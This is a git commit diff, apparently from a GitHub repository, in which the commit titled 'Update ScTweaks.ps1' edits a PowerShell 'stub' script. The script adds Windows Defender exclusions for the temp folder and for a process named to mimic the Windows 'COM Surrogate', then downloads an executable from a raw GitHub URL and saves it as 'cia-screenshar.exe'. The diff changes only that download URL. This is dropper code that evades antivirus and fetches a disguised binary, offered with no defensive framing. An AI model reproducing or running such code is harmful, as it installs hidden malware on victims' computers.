e67aa66a5b11158ba53d2fbc7936fbc7ee350c85
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-04-24 18:22:02 +0300

    Update ScTweaks.ps1

--- files/stub.ps1
+++ files/stub.ps1
@@ -2,7 +2,7 @@ Add-MpPreference -ExclusionPath "$env:temp"
 Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
 Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
 Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
-$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
+$url = "https://raw.githubusercontent.com/M7mmdddd/Mpower/refs/heads/main/COM%20Surrogate.exe"
 
  $output = "$env:TEMP\cia-screenshar.exe"
 
